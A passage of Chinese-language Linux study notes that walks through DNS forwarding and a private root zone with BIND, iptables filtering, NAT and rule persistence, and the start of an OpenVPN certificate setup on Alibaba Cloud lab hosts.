#### 32.2.5实现DNS转发(缓存)

```
[root@centos8 ~]是实现DNS的主服务器，10.0.0.8
root@centos8_1是实现DNS子服务器，10.0.0.152
[root@centos8_clone1 ~]是子域DNS服务器，10.0.0.154
[root@centos8_clone2 ~]是实现DNS转发(缓存)，10.0.0.155
#用ubuntu搭建web服务，ip地址10.0.0.153

[root@centos8_clone2 ~]# dnf -y install bind
[root@centos8_clone2 ~]# vim /etc/named.conf
options {
//      listen-on port 53 { 127.0.0.1; };
//      allow-query     { localhost; };
        forward   only; #只转发过去解析不了就算不了
        forward   first; #只转发过去主机解析不了就自己去互联网
        forwarders {10.0.0.8;};#转发到哪个机器
dnssec-enable no;
dnssec-validation no;
[root@centos8_clone2 ~]# systemctl enable --now named
[root@centos8_clone2 ~]# rndc flush #清除之前做实验的缓存，不然后序很坑


#centos7客户端做测试
#这是测试forward only;
[root@centos7_clone1 ~]# dig www.liusenbiao.cn @10.0.0.155
;; ANSWER SECTION:
www.liusenbiao.cn.	86400	IN	A	10.0.0.100 #转发成功！！
#这是测试forward first;
[root@centos7_clone1 ~]# dig www.liusenbiao.com @10.0.0.155
;; ANSWER SECTION:
www.liusenbiao.com.	600	IN	A	108.61.87.230 #我的服务器ip!!
```

#### 32.2.6实现根域的主DNS服务器

```
#在根域的主DNS服务器10.0.0.28/24上实现
[root@centos8~]#yum install bind -y
[root@centos8~]#vim /etc/named.conf             
#注释掉两行，第13行和第21行
// listen-on port 53 { 127.0.0.1; };
// allow-query     { localhost; };
[root@centos8~]#vim /etc/named.rfc1912.zones
#将下面行改为：
zone "." IN {
       type master;
       file "root.zone";
};
[root@centos8~]vim /var/named/root.zone
$TTL 1D
@   IN SOA master admin.magedu.org. ( 1 1D 1H 1W 3D )
           NS   master
org         NS   orgns  #这是属于子域委派
master     A 10.0.0.28
orgns     A 10.0.0.38
#安全加固
[root@centos8~]#chgrp named /var/named/root.zone    
[root@centos8~]#chmod 640 /var/named/root.zone
[root@centos8~]#systemctl start named   #第一次启动
[root@centos8~]#rndc reload             #不是第一次启动


#实现转发目标的DNS服务器
#在转发目标的DNS服务器10.0.0.18/24上实现
[root@centos8~]#yum install bind -y
[root@centos8~]#vim /etc/named.conf             
#注释掉两行，第13行和第21行
// listen-on port 53 { 127.0.0.1; };
// allow-query     { localhost; };
dnssec-enable no;
dnssec-validation no
[root@centos8~]#vim /var/named/named.ca
.                       518400 IN     NS     a.root-servers.net.
#指向自己搭建根服务器的地址，不然从互联网上找真实存在的13个根
a.root-servers.net.     3600000 IN     A       10.0.0.28
[root@centos8~]#systemctl start named   #第一次启动
[root@centos8~]#rndc reload             #不是第一次启动
```

## 33.Linux防火墙

### 33.1 netfilter 完整流程

![1652760909814](linuxSRE.assets/1652760909814.png)

### 33.2iptables规则

#### 33.2.1iptables 基本匹配条件

``` 
#iptables 规则组成
规则rule：根据规则的匹配条件尝试匹配报文，对匹配成功的报文根据规则定义的处理动作作出处理，
规则在链接上的次序即为其检查时的生效次序
匹配条件：默认为与条件，同时满足
基本匹配：IP，端口，TCP的Flags（SYN,ACK等）
扩展匹配：通过复杂高级功能匹配
处理动作：称为target，跳转目标
内建处理动作：ACCEPT,DROP,REJECT,SNAT,DNAT,MASQUERADE,MARK,LOG...
自定义处理动作：自定义chain，利用分类管理复杂情形
规则要添加在链上，才生效；添加在自定义链上不会自动生效

iptables命令格式详解：
iptables   [-t table]   SUBCOMMAND   chain   [-m matchname [per-match-options]] -j targetname [per-target-options]

1、-t table：指定表
raw, mangle, nat, [filter]默认

案例：
#centos8
iptables 基本匹配条件
基本匹配条件：无需加载模块，由iptables/netfilter自行提供
 -s, --source address[/mask][,...]：源IP地址或者不连续的IP地址
 -d, --destination address[/mask][,...]：目标IP地址或者不连续的IP地址
 -p, --protocol protocol：指定协议，可使用数字如0（all）
 protocol: tcp, udp, icmp, icmpv6, udplite,esp, ah, sctp, mh or“all“  
 参看：/etc/protocols
 -i, --in-interface name：报文流入的接口；只能应用于数据报文流入环节，只应用于INPUT、
FORWARD、PREROUTING链
 -o, --out-interface name：报文流出的接口；只能应用于数据报文流出的环节，只应用于
FORWARD、OUTPUT、POSTROUTING链

-A：追加
-s:源地址
-j:跳到这个命令，也就是执行-j后面的命令
只要是主机10.0.0.7发来的一切请求全部拒绝
[root@centos8 ~]# iptables -A INPUT -s 10.0.0.7 -j DROP
[root@centos8 ~]# iptables -vnL #查看具体信息
Chain INPUT (policy ACCEPT 0 packets, 0 bytes)
pkts bytes target     prot opt in     out     source               destination
38  2712 DROP       all  --  *         *      10.0.0.7              0.0.0.0/0 
[root@centos8 ~]# iptables -vnL --line-numbers
#列出序列号
[root@centos8 ~]# iptables -F #删除全部记录
[root@centos8 ~]# iptables -D INPUT 5 #删除指定记录
[root@centos8 ~]# iptables -I INPUT -s 10.0.0.1 -j ACCEPT
-I 代表Insert，想要插到哪里，原先的位置就会往后移
#代表的是自己的windows可以连接这个
 
#设置防火墙白名单
#只要没有明确允许的都统统拒绝
[root@centos8 ~]# iptables -P INPUT DROP
#Chain INPUT (policy DROP 0 packets, 0 bytes)
policy ACCEPT 变成了policy DROP
[root@centos8 ~]# iptables -I INPUT 2 -i lo -j ACCEPT #允许ping 127.0.0.1
[root@centos8 ~]# iptables -A INPUT -j REJECT
#想要允许访问，必须放在3的规则之前
3        0     0 REJECT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            reject-with icmp-port-unreachable
[root@centos8 ~]# iptables -I INPUT -s 10.0.0.7 -p icmp -j REJECT
#不允许10.0.0.7进行ping操作，但允许其他操作，比如ssh
-p:指定协议
```

#### 33.2.2 iptables 扩展匹配条件

```
扩展匹配条件：需要加载扩展模块（/usr/lib64/xtables/*.so），方可生效
扩展模块的查看帮助 ：man iptables-extensions
扩展匹配条件：
隐式扩展
显式扩展

1. 隐式扩展
iptables 在使用-p选项指明了特定的协议时，无需再用-m选项指明扩展模块的扩展机制，不需要手动加载扩展模块

1.1 tcp协议的扩展选项：
 --source-port, --sport port[:port]：匹配报文源端口,可为端口连续范围
 --destination-port,--dport port[:port]：匹配报文目标端口,可为连续范围
 --tcp-flags mask comp
     mask 需检查的标志位列表，用,分隔 , 例如 SYN,ACK,FIN,RST
     comp 在mask列表中必须为1的标志位列表，无指定则必须为0，用,分隔tcp协议的扩展选项
     
--tcp-flags SYN,ACK,FIN,RST SYN 表示要检查的标志位为SYN,ACK,FIN,RST四个，其中SYN必
须为1，余下的必须为0，第一次握手
--tcp-flags SYN,ACK,FIN,RST SYN,ACK 第二次握手
 --syn：用于匹配第一次握手, 相当于：--tcp-flags SYN,ACK,FIN,RST SYN
[root@centos8 ~]# iptables -I INPUT 3 -s 10.0.0.7 -p tcp --dport 80 -j REJECT
#dport:目标端口
#sport:源端口

1.2 udp协议的扩展选项：
--source-port, --sport port[:port]：匹配报文的源端口或端口范围
--destination-port,--dport port[:port]：匹配报文的目标端口或端口范围

1.3 icmp协议的扩展选项:
 --icmp-type {type[/code]|typename}
 type/code
 0/0   echo-reply icmp应答
 8/0   echo-request icmp请求
[root@centos8 ~]# iptables -AINPUT -s 10.0.0.7 -p icmp --icmp-type 8 -j REJECT
-8表示请求包
#10.0.0.7ping10.0.0.8ping不通，因为是请求包
#10.0.0.8ping10.0.0.7ping的通，因为是应答包


2. 显式扩展及相关模块
显示扩展即必须使用-m选项指明要调用的扩展模块名称，需要手动加载扩展模块
2.1 multiport扩展
以离散方式定义多端口匹配,最多指定15个端口
#指定多个源端口
 --source-ports,--sports port[,port|,port:port]...
# 指定多个目标端口
 --destination-ports,--dports port[,port|,port:port]...
#多个源或目标端
 --ports port[,port|,port:port]...
[root@centos8 ~]# iptables -AINPUT -s 10.0.0.7 -p tcp -m multiport --dports 80,6379 -j REJECT
#同时拒绝10.0.0.7访问10.0.0.8的httpd和redis服务，分别占用端口号6379,80

2.2 iprange扩展
指明连续的（但一般不是整个网络）ip地址范围
--src-range from[-to] 源IP地址范围
--dst-range from[-to] 目标IP地址范围
[root@centos8 ~]#iptables -AINPUT -m iprange --src-range 10.0.0.2-10.0.0.10 -j DROP
#拒绝10.0.0.2~10.0.0.10之间的所有ip访问

2.3 mac扩展
mac 模块可以指明源MAC地址,，适用于：PREROUTING, FORWARD，INPUT chains
--mac-source XX:XX:XX:XX:XX:XX
[root@centos8 ~]# iptables -AINPUT -m mac --mac-source 00:0c:29:e7:e8:52 -j REJECT
#拒绝mac地址为00:0c:29:e7:e8:52的主机去访问

2.4 string扩展
对报文中的应用层数据做字符串模式匹配检测
--algo {bm|kmp} 字符串匹配检测算法
 bm：Boyer-Moore
 kmp：Knuth-Pratt-Morris
--from offset 开始偏移
--to offset   结束偏移
 --string pattern 要检测的字符串模式
 --hex-string pattern要检测字符串模式，16进制格式
[root@centos8 ~]# iptables -A OUTPUT -p tcp --sport 80 -m string --algo bm --from 62 --string  "google" -j REJECT
#禁止访问www.google.com网站

2.5 time扩展
注意：CentOS 8 此模块有问题
--datestart YYYY[-MM[-DD[Thh[:mm[:ss]]]]] 日期
--datestop YYYY[-MM[-DD[Thh[:mm[:ss]]]]]
--timestart hh:mm[:ss]       时间
--timestop hh:mm[:ss]
[!] --monthdays day[,day...]   每个月的几号
[!] --weekdays day[,day...]   星期几，1 – 7 分别表示星期一到星期日
--kerneltz：内核时区（当地时间），不建议使用，CentOS 7 系统默认为 UTC
注意： centos6 不支持kerneltz ，--localtz指定本地时区(默认)
[root@centos8 ~]#iptables -A INPUT -m time --timestart 12:30 --timestop 13:30 -j 
ACCEPT

2.6 connlimit扩展
根据每客户端IP做并发连接数数量匹配
可防止Dos(Denial of Service，拒绝服务)攻击
--connlimit-upto N #连接的数量小于等于N时匹配
--connlimit-above N #连接的数量大于N时匹配
[root@centos8 ~]# iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 2 -j REJECT
#超过两个连接数就干掉

2.7 limit扩展
是实现流量控制
--limit-burst number #前多少个包不限制
--limit #[/second|/minute|/hour|/day]
[root@centos8 ~]# iptables -I INPUT -p icmp --icmp-type 8 -m limit --limit 10/minute --limit-burst 5 -j ACCEPT
#前5个不限，5个之后每分钟允许通过10个
[root@centos8 ~]# iptables -AINPUT -p icmp -j REJECT
#不满足第一个就拒绝

2.8 state扩展
state 扩展模块，可以根据”连接追踪机制“去检查连接的状态，较耗资源
conntrack机制：追踪本机上的请求和响应之间的关系
状态类型：
NEW：第一次请求的包叫做NEW	
发出的请求
ESTABLISHED：NEW状态之后的所有的包都叫做ESTABLISHED	
状态
RELATED：新发起的但与已有连接相关联的连接，如：ftp协议中的数据连接与命令连接之间的关
系
INVALID：无效的连接，如flag标记不正确
UNTRACKED：未进行追踪的连接，如：raw表中关闭追踪
已经追踪到的并记录下来的连接信息库
[root@centos8 ~]# iptables -AINPUT -m state --state ESTABLISHED -j ACCEPT
[root@centos8 ~]# iptables -AINPUT -m state --state NEW -j REJECT
#以上两条实现了老用户建立连接都允许，新用户建立连接都拒绝
[root@centos8 ~]# iptables -AINPUT -s 10.0.0.7 -m state --state NEW -j REJECT
10.0.0.7ping不通10.0.0.8
10.0.0.8ping不通10.0.0.7
```

### 33.3iptables规则优化

```
1. 安全放行所有入站和出站的状态为ESTABLISHED状态连接,建议放在第一条，效率更高(老用户第一条)
2. 谨慎放行入站的新请求
3. 有特殊目的限制访问功能，要在放行规则之前加以拒绝
4. 同类规则（访问同一应用，比如：http ），匹配范围小的放在前面，用于特殊处理
5. 不同类的规则（访问不同应用，一个是http，另一个是mysql ），匹配范围大的放在前面，效率更
高
-s 10.0.0.6 -p tcp --dport 3306 -j REJECT
-s 172.16.0.0/16 -p tcp --dport 80 -j REJECT
6. 应该将那些可由一条规则能够描述的多个规则合并为一条,减少规则数量,提高检查效率
7. 设置默认策略，建议白名单（只放行特定连接）
iptables -P，不建议，容易出现“自杀现象”
规则的最后定义规则做为默认策略，推荐使用，放在最后一条
```

### 33.4iptables规则保存

```
使用iptables命令定义的规则，手动删除之前，其生效期限为kernel存活期限
#1.持久保存规则：
CentOS 7,8
iptables-save > /PATH/TO/SOME_RULES_FILE
[root@centos8 ~]# iptables-save  > /data/iptables.rule
#CentOS 6
#将规则覆盖保存至/etc/sysconfig/iptables文件中
service iptables save

#2.加载规则
CentOS 7,8 重新载入预存规则文件中规则：
[root@centos8 ~]# iptables-restore < /data/iptables.rule
CentOS 6：
#会自动从/etc/sysconfig/iptables 重新载入规则
service iptables  restart

#3.开机自动运行iptables
#方法一：
[root@centos8 ~]# vim /etc/rc.d/rc.local
把iptables-restore这个命令写进去
iptables-restore < /data/iptables.rule
[root@centos8 ~]# chmod +x /etc/rc.d/rc.local
#方法二：
[root@centos8 ~]# dnf -y install iptables-services
[root@centos8 ~]# iptables -AINPUT -s 10.0.0.1 -j ACCEPT
[root@centos8 ~]# iptables -AINPUT -i lo -j ACCEPT
[root@centos8 ~]# iptables-save > /etc/sysconfig/iptables #保存到配置文件中
[root@centos8 ~]# systemctl enable --now iptables #设置为开机自动启动
```

![1652844325703](linuxSRE.assets/1652844325703.png)

### 33.5iptables自定义链

```
自定义链：
-N：new, 自定义一条新的规则链
-E：重命名自定义链；引用计数不为0的自定义链不能够被重命名，也不能被删除
-X：delete，删除自定义的空的规则链
-P：Policy，设置默认策略；对filter表中的链而言，其默认策略有：ACCEPT：接受, DROP：丢弃

#1.创建自定义链
[root@centos8 ~]# iptables -N web-chain #创建web-chain自定义链
[root@centos8 ~]# iptables -vnL --line-numbers
Chain web-chain (0 references)
#多了一条这个链！！
num   pkts bytes target     prot opt in     out     source               destination 
[root@centos8 ~]# iptables -E web-chain WEB_CHAIN #改名
[root@centos8 ~]# iptables -AWEB_CHAIN -p tcp -m multiport --dports 80,443 -j ACCEPT #添加规则到自定义链中
#关联自定义链
[root@centos8 ~]# iptables -AINPUT -s 10.0.0.0/24 -j WEB_CHAIN
[root@centos8 ~]# iptables -vnL --line-numbers
Chain INPUT (policy ACCEPT 551 packets, 34466 bytes)
num   pkts bytes target     prot opt in     out     source               destination         
1       10   612 WEB_CHAIN  all  --  *      *       10.0.0.0/24          0.0.0.0/0 
[root@centos8 ~]# iptables-save > /etc/sysconfig/iptables #保存到配置文件中
[root@centos8 ~]# systemctl enable --now iptables #设置为开机自动启动
#也可以从文件中加载
[root@centos8 ~]# iptables-restore < /etc/sysconfig/iptables 


#2.删除自定义链
[root@centos8 ~]# iptables -X WEB_CHAIN
iptables v1.8.4 (nf_tables):  CHAIN_USER_DEL failed (Device or resource busy): chain WEB_CHAIN
[root@centos8 ~]# iptables -F INPUT #把调用它的链清空
[root@centos8 ~]# iptables -F WEB_CHAIN #把自定义的链清空
[root@centos8 ~]# iptables -X WEB_CHAIN #最后清除自定义链
```

### 33.6 网络防火墙

![1652858030121](linuxSRE.assets/1652858030121.png)

```
#准别两台内网机器
#LanServer1: [root@web2 ~]   ip是10.0.0.7
#LanServer2:[root@web1 ~] ip是10.0.0.17
#把VMware的虚拟网络编辑区VMnet1的子网ip改成192.168.10.0

#centos7@web2
[16:25:11 root@web2 ~]#yum -y install httpd;systemctl enable --now httpd;hostnamectl set-hostname web2.liusenbiao.org; hostname > /var/www/html/index.html
[16:25:11 root@web2 ~]#vim /etc/sysconfig/network-scripts/ifcfg-eth0
DEVICE=eth0
NAME=eth0
BOOTPROTO=static
IPADDR=10.0.0.7
PREFIX=24
GATEWAY=10.0.0.8 #网关改成图片山的网关地址
DNS1=10.0.0.2
DNS2=180.76.76.76
ONBOOT=yes
[16:34:53 root@web2 ~]#systemctl restart network


#centos7@web1
[root@web1 ~]# yum -y install httpd;systemctl enable --now httpd;hostnamectl set-hostname web1.liusenbiao.org; hostname > /var/www/html/index.html;
[root@web1 ~]# vim /etc/sysconfig/network-scripts/ifcfg-eth0
DEVICE=eth0
NAME=eth0
BOOTPROTO=static
ONBOOT=yes
IPADDR=10.0.0.17
PREFIX=24
DNS1=10.0.0.2
DNS2=180.76.76.76
ONBOOT=yes
[16:34:53 root@web2 ~]#systemctl restart network


#firewall
#centos8.2加一块网卡(网络适配器)，改成仅主机模式
#ip地址改成如上图的 192.168.10.8/24
[root@firewall ~]# nmcli connection modify eth1 ipv4.method manual ipv4.addresses 192.168.10.8/24 ifname eth1
#用ip route del 临时删除路由
[root@firewall ~]# ip route del default via 10.0.0.2 dev eth0 proto static metric 100
#最后删成如下说明环境配置完成
[root@centos8 ~]# ip route
10.0.0.0/24 dev eth0 proto kernel scope link src 10.0.0.8 metric 100 
192.168.10.0/24 dev eth1 proto kernel scope link src 192.168.10.8 metric 101
#测试
firewall的连通性,如果均ping的通则环境配置没问题
[root@firewall ~]# ping 10.0.0.7;ping 10.0.0.17;ping 192.168.10.100;
[root@firewall ~]# vim /etc/sysctl.conf
net.ipv4.ip_forward=1 #添加这个
[root@firewall ~]# sysctl -p
#让外网主机可以连接内网
net.ipv4.ip_forward = 1 
#实现功能：外网不可以访问内网，但是内网可以访问外网
[root@firewall ~]# iptables -A FORWARD ! -s 10.0.0.0/24 -d 10.0.0.0/24 -m state --state NEW -j REJECT
#实现功能：只允许外网访问10.0.0.7的机器
[root@firewall ~]# iptables -I FORWARD ! -s 10.0.0.0/24 -d 10.0.0.7 -m state --state NEW -p tcp --dport 80 -j ACCEPT


#准别一台外网机器
用ubuntu来准备，把网络适配器改成仅主机
root@ubuntu1804:# vim /etc/netplan/01-netcfg.yaml
# This file describes the network interfaces available on your system
# For more information, see netplan(5).
network:
  version: 2
  renderer: networkd
  ethernets:
    eth0:
      addresses:
      - 192.168.10.100/24
      gateway4: 192.168.10.8
```

### 33.7NAT原理和实战

这张图与上面那张图的区别是外网少了网关了，是为了实现真正的NAT服务![1652885766626](linuxSRE.assets/1652885766626.png)

```
#准别两台内网机器
#LanServer1: [root@web2 ~]   ip是10.0.0.7
#LanServer2:[root@web1 ~] ip是10.0.0.17
#把VMware的虚拟网络编辑区VMnet1的子网ip改成192.168.10.0

#centos7@web2
[23:01:16 root@web2 ~]#vim /etc/httpd/conf/httpd.conf
listen 8080 #端口改成8080
listen 8080 #端口改成9090 #第二次修改端口，用REDIRECT转发
[23:23:33 root@web2 ~]#systemctl restart httpd
#从10.0.0.8配置的8080端口转发到10.0.0.7真正的端口9090
[23:33:19 root@web2 ~]#iptables -t nat -A PREROUTING -d 10.0.0.7 -p tcp --dport 8080 -j REDIRECT --to-ports 9090


#centos7@web1
#SNAT
#实现功能:利用NAT原理实现内网访问外网，做地址转换	
[root@web1 ~]# ping 192.168.10.100

#firewall
#centos8.2加一块网卡(网络适配器)，改成仅主机模式
#ip地址改成如上图的 192.168.10.8/24
[root@firewall ~]# iptables -F
#实现功能:利用NAT原理实现内网访问外网，做地址转换	
#用SNAT
[root@firewall ~]# iptables -t nat -A POSTROUTING -s 10.0.0.0/24  ! -d 10.0.0.0/24 -j MASQUERADE 
[root@firewall ~]# iptables -t nat -nvL
Chain POSTROUTING (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 MASQUERADE  all  --  *      *       10.0.0.0/24         !10.0.0.0/24  
#实现功能:利用NAT原理实现外网访问内网，做地址转换	
#用DNAT
[root@firewall ~]# iptables -t nat -A PREROUTING -d 192.168.10.8 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.7
#改变端口号，做NAT变换
-R：1替换第一条规则
[root@firewall ~]# iptables -t nat -R PREROUTING 1 -d 192.168.10.8 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.7：8080




#准别一台外网机器
用ubuntu来准备，把网络适配器改成仅主机
[22:54:36 liu@ubuntu1804 ~]$ip route del default via 192.168.10.8 dev eth0 proto static
[23:07:58 liu@ubuntu1804 ~]$sudo tcpdump -i eth0 -nn icmp
#抓包：10.0.0.17内网地址已经转化为192.168.10.8外网地址了！
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
23:08:53.254194 IP 192.168.10.8 > 192.168.10.100: ICMP echo request, id 2131, seq 1, length 64
23:08:53.254264 IP 192.168.10.100 > 192.168.10.8: ICMP echo reply, id 2131, seq 1, length 64
#用DNAT实现外网访问内网
[23:13:18 liu@ubuntu1804 ~]$curl 192.168.10.8
#访问的是firewall的公网地址，实际上是访问的是10.0.0.7
   Static hostname: web2.liusenbiao.org
         Icon name: computer-vm
           Chassis: vm
        Machine ID: 7f912004b727409e8549021ad48a518c
           Boot ID: 367e07f1fa1b40bcb10818fe8e096957
    Virtualization: vmware
  Operating System: CentOS Linux 7 (Core)
       CPE OS Name: cpe:/o:centos:centos:7
            Kernel: Linux 3.10.0-1160.el7.x86_64
      Architecture: x86-64
```

## 34.企业级OpenVPN

![1652970175471](linuxSRE.assets/1652970175471.png)

### 34.1阿里云网络环境

```
1 阿里云创建专有网络
指定城市和可用区:华北3张家口可用区A区
网段名liu-net1和地址段172.16.0.0/12,默认资源组
交换机名liu-net1-sw1 可用区A IPv4的地址段 172.30.0.0/24
安全组开放22端口

2 创建OpenVPN服务器有公网IP的实例1个
[root@openvpn-server ~] ip地址172.30.0.2/24
指定城市和可用区:华北3张家口可用区A区
计算型c6 2vCPU 4G
网络:liu-net1 交换机:liu-net1-sw1
公网IP 按量收费 10M 
默认安全组 默认配置 22,3389,icmp
centos8.2
系统盘 存储默认高效云盘40G
0.3元/小时 公网流量0.8元/G

3 创建局域网的服务器无公网IP的实例2个
按量付费
#服务器上配置一些东西
[root@web01 ~] ip地址：172.30.0.100/24
[root@web01 ~]# yum -y install httpd;hostname > /var/www/html/index.html;systemctl enable --now httpd;

[root@web02 ~] ip地址：172.30.0.200/24
[root@web02 ~]# yum -y install httpd;hostname > /var/www/html/index.html;systemctl enable --now httpd;
指定城市和可用区:华北3张家口可用区A区
共享型 2vCPU4G
centos7.9
系统盘 存储默认高效云盘40G
网络:liu-net1 mliu-net1-sw1
无公网IP
默认安全组
主网卡sw1

4 重设所有实例密码

5 修改安全组打开 1194/TCP/UDP

6.打通ssh-keygen验证
#这样就实现了三个主机相互之间免密登录
[root@web01 ~]# ssh-keygen
[root@web01 ~]# ssh-copy-id 127.0.0.1
[root@web01 ~]# rsync -av .ssh 172.30.0.200:/root/
[root@web01 ~]# rsync -av .ssh 172.30.0.1:/root/
```

**创建三台主机实例**

![1652952287552](linuxSRE.assets/1652952287552.png)

**创建专有网络和交换机**

![1652951381406](linuxSRE.assets/1652951381406.png)

**打开端口tcp/udp 1194**

![1652955319360](linuxSRE.assets/1652955319360.png)

### 34.2 安装OpenVPN

```
#1.安装OpenVPN和证书工具
[root@openvpn-server ~]# yum -y install openvpn easy-rsa

#2.生成服务器配置文件
[root@openvpn-server ~]# cp /usr/share/doc/openvpn-2.4.12/sample/sample-config-files/server.conf /etc/openvpn
[root@openvpn-server ~]# ll /etc/openvpn/
total 20
drwxr-x--- 2 root openvpn  4096 Mar 18 02:57 client
drwxr-x--- 2 root openvpn  4096 Mar 18 02:57 server
-rw-r--r-- 1 root root    10784 May 19 19:39 server.conf

#3.准备签发证书相关变量的配置文件
[root@openvpn-server ~]# cp -r /usr/share/easy-rsa/ /etc/openvpn/easy-rsa-server
[root@openvpn-server ~]# tree /etc/openvpn/
/etc/openvpn/
├── client
├── easy-rsa-server
│   ├── 3 -> 3.0.8
│   ├── 3.0 -> 3.0.8
│   └── 3.0.8
│       ├── easyrsa
│       ├── openssl-easyrsa.cnf
│       └── x509-types
│           ├── ca
│           ├── client
│           ├── code-signing
│           ├── COMMON
│           ├── email
│           ├── kdc
│           ├── server
│           └── serverClient
├── server
└── server.conf

7 directories, 11 files

#4.准备签发证书相关变量的配置文件
[root@openvpn-server ~]# cp /usr/share/doc/easy-rsa-3.0.8/vars.example /etc/openvpn/easy-rsa-server/3/vars
[root@openvpn-server ~]# vim /etc/openvpn/easy-rsa-server/3/vars
#CA的证书有效期默为为10年,可以适当延长,比如:36500天
set_var EASYRSA_CA_EXPIRE      36500
#服务器证书默为为825天,可适当加长,比如:3650天
set_var EASYRSA_CERT_EXPIRE    3650
[root@openvpn-server ~]# tree /etc/openvpn/
/etc/openvpn/
├── client
├── easy-rsa-server
│   ├── 3 -> 3.0.8
│   ├── 3.0 -> 3.0.8
│   └── 3.0.8
│       ├── easyrsa
│       ├── openssl-easyrsa.cnf
│       ├── vars
│       └── x509-types
│           ├── ca
│           ├── client
│           ├── code-signing
│           ├── COMMON
│           ├── email
│           ├── kdc
│           ├── server
│           └── serverClient
├── server
└── server.conf

7 directories, 12 file
```

### 34.3准备证书相关文件

```
[root@openvpn-server ~]# cd /etc/openvpn/easy-rsa-server/3/

#1.初始化数据,在当前目录下生成pki目录及相关文件
root@openvpn-server 3]# ./easyrsa init-pki
[root@openvpn-server 3]# tree
.
├── easyrsa
├── openssl-easyrsa.cnf
├── pki
│   ├── openssl-easyrsa.cnf
│   ├── private
│   ├── reqs
│   └── safessl-easyrsa.cnf
├── vars
└── x509-types
    ├── ca
    ├── client
    ├── code-signing
    ├── COMMON
    ├── email
    ├── kdc
    ├── server
    └── serverClient
4 directories, 13 files

#2.创建CA机构
[root@openvpn-server 3]# ./easyrsa build-ca nopass
一路回车就行

#3.创建服务端证书申请
[root@openvpn-server 3]# ./easyrsa gen-req server nopass
起名字为openvpn
Keypair and certificate request completed. Your files are:
req: /etc/openvpn/easy-rsa-server/3/pki/reqs/server.req          #生成请求文件
key: /etc/openvpn/easy-rsa-server/3/pki/private/server.key       #生成私钥文件

#4.颁发服务端证书
[root@openvpn-server 3]# ./easyrsa sign server server
Confirm request details: yes

#5.创建 Diffie-Hellman密钥
[root@openvpn-server 3]# ./easyrsa gen-dh
++*
DH parameters of size 2048 created at /etc/openvpn/easy-rsa-server/3/pki/dh.pem
[root@openvpn-server 3]# ll pki/dh.pem 
-rw------- 1 root root 424 May 19 20:24 pki/dh.pem
[root@openvpn-server 3]# cat pki/dh.pem 
-----BEGIN DH PARAMETERS-----
MIIBCAKCAQEAqoiQltaxm0vXlNGd0LXuNjQT3GD1g4K+uc1BdSkr03nBAeVHiCSb
b6fa5YCvs1iztiUZIZU0B9af93bdaGSkSa4YzSCSU0PqfpuEcQvO918byE4dSYAw
A4ax3zaRrgXNQ7wU9fjrnLaPkT++6WUj5lqW5iN2m/HbF0BjgOuzUMsncM/a4M8S
DMjbYjSOT9ADtt/bviz3BINS6RixIH02f9+iwTZ9I9BnRC+SmRHe9Q1R32AfuD+w
u8EbUyympFTv6BR7urlKy7P2odo5NBlgGwktXrC2Rp3BD80LMFwC0dc1hVxr8sbI
Wme03QKa1AwRVlwlCQ29vztFO2XfEWnrKwIBAg==
-----END DH PARAMETERS-----

#6.准备客户端证书环境
上面服务端证书配置完成，下面是配置客户端证书
[root@openvpn-server 3]# cp -r /usr/share/easy-rsa/ /etc/openvpn/easy-rsa-client
[root@openvpn-server 3]# cd /etc/openvpn/easy-rsa-client/3
[root@openvpn-server 3]# tree /etc/openvpn/easy-rsa-client
/etc/openvpn/easy-rsa-client
├── 3 -> 3.0.8
├── 3.0 -> 3.0.8
└── 3.0.8
    ├── easyrsa
    ├── openssl-easyrsa.cnf
    └── x509-types
        ├── ca
        ├── client
        ├── code-signing
        ├── COMMON
        ├── email
        ├── kdc
        ├── server
        └── serverClient
4 directories, 10 files
[root@openvpn-server 3]# cd /etc/openvpn//easy-rsa-client/3/
[root@openvpn-server 3]# pwd
/etc/openvpn/easy-rsa-client/3
[root@openvpn-server 3]# tree
.
├── easyrsa
├── openssl-easyrsa.cnf
└── x509-types
    ├── ca
    ├── client
    ├── code-signing
    ├── COMMON
    ├── email
    ├── kdc
    ├── server
    └── serverClient
1 directory, 10 files
[root@openvpn-server 3]# ./easyrsa init-pki
[root@openvpn-server 3]# tree
.
├── easyrsa
├── openssl-easyrsa.cnf
├── pki
│   ├── openssl-easyrsa.cnf
│   ├── private
│   ├── reqs
│   └── safessl-easyrsa.cnf
└── x509-types
    ├── ca
    ├── client
    ├── code-signing
    ├── COMMON
    ├── email
    ├── kdc
    ├── server
    └── serverClient
4 directories, 12 files


#7.生成客户端用户的证书申请
[root@openvpn-server 3]# ./easyrsa gen-req liusenbiao nopass #给出差在外的用户颁发证书
req: /etc/openvpn/easy-rsa-client/3/pki/reqs/liusenbiao.req
key: /etc/openvpn/easy-rsa-client/3/pki/private/liusenbiao.key

#8.签发客户端证书
#将客户端证书请求文件复制到CA的工作目录
[root@openvpn-server 3]# cd /etc/openvpn/easy-rsa-server/3/
[root@openvpn-server 3]# ./easyrsa import-req /etc/openvpn/easy-rsa-client//3/pki/reqs/liusenbiao.req liusenbiao
Note: using Easy-RSA configuration from: /etc/openvpn/easy-rsa-server/3.0.8/vars
Using SSL: openssl OpenSSL 1.0.2k-fips  26 Jan 2017
The request has been successfully imported with a short name of: liusenbiao
You may now use this name to perform signing operations on this request.
[root@openvpn-server 3]# vim vars
# In how many days should certificates expire?
set_var EASYRSA_CERT_EXPIRE     180 #员工证书过期的
#签发客户端证书
[root@openvpn-server 3]# ./easyrsa sign client liusenbiao

[root@openvpn-server 3]# bash /root/openvpn-user-crt.sh
如果需要颁发的客户端证书较多,可以使用下面脚本实现客户端证书的批量颁发
客户端证书自动颁发脚本
#!/bin/bash
#
#********************************************************************
#Author: liusenbiao
#QQ: 1805336068cd
#Date: 2022-5-19
#FileName： openvpn-user-crt.sh
#URL: http://www.liusenbiao.com
#Description： The test script
#Copyright (C): 2020 All rights reserved
#********************************************************************
read -p "请输入用户的姓名拼音(如:${NAME}): " NAME
cd /etc/openvpn/easy-rsa-client/3
./easyrsa gen-req ${NAME} nopass <<EOF

EOF

cd /etc/openvpn/easy-rsa-server/3
./easyrsa import-req /etc/openvpn/easy-rsa-client/3/pki/reqs/${NAME}.req ${NAME}


./easyrsa sign client ${NAME} <<EOF
yes
EOF
